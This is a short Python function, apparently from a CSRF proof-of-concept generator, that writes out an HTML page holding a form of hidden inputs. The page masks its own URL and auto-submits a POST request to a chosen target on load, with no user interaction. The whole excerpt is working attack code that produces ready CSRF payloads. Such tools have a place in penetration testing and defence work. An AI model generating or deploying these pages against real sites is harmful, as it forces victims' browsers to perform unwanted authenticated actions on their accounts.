# ----------------------------------------------------------------
# P3: POST form auto-submit (no interaction)
# ----------------------------------------------------------------
def gen_post_autosubmit(action: str, params: dict) -> str:
    inputs = _hidden_inputs(params)
    html = f"""<html>
{ATTRIBUTION}
<head><title>CSRF POST PoC</title></head>
<body>
  <script>history.pushState('', '', '/');</script>
  <form id="csrfform" action="{_esc_attr(action)}" method="POST" enctype="application/x-www-form-urlencoded">
{inputs}
      <input type="submit" value="Submit" />
  </form>
  <script>document.getElementById('csrfform').submit();</script>
</body>
</html>"""
    return _save_poc(f"{_sanitize_filename(action)}-post-auto.html", html)


